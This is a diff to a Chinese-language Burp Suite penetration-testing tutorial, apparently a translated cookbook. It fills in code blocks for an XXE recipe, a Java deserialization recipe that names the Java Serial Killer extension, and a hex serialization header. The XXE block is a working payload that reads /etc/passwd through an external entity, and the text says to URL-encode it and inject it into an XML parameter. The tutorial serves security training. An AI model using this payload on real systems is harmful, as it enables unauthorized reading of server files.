@@ -54,7 +54,15 @@ XXE 是针对解析 XML 的应用程序的漏洞。攻击者可以使用任意�
 
 1.  使用 Burp 代理拦截器，将此 XML 参数值替换为以下有效负载。这个新的有效负载将对操作系统上应该被限制查看的文件发出请求，即`/etc/passwd`文件：
 
-[PRE0]
+```
+<?xml version="1.0"?>
+    <!DOCTYPE change-log[
+        <!ENTITY systemEntity SYSTEM "../../../../etc/passwd">
+    ]>
+    <change-log>
+        <text>&systemEntity;</text>
+    </change-log>
+```
 
 由于新的 XML 消息中有奇怪的字符和空格，让我们在将其粘贴到`xml`参数之前，将此有效负载输入到解码器部分并进行 URL 编码。
 
@@ -244,7 +252,9 @@ SSRF 是一种漏洞，允许攻击者强制应用程序代表攻击者进行未
 
 # 准备工作
 
-[PRE1]
+```
+Java Serial Killer Burp extension to assist in performing Java deserialization attacks.
+```
 
 # 如何操作...
 
@@ -266,7 +276,9 @@ SSRF 是一种漏洞，允许攻击者强制应用程序代表攻击者进行未
 
 1.  切换到解码器选项卡并复制以下序列化对象的片段：
 
-[PRE2]
+```
+AC ED 00 05 73 72 00 0A 53 65 72 69 61 6C 54 65
+```
 
 1.  将十六进制数粘贴到解码器选项卡，单击“编码为...”按钮，然后选择 base 64：
 
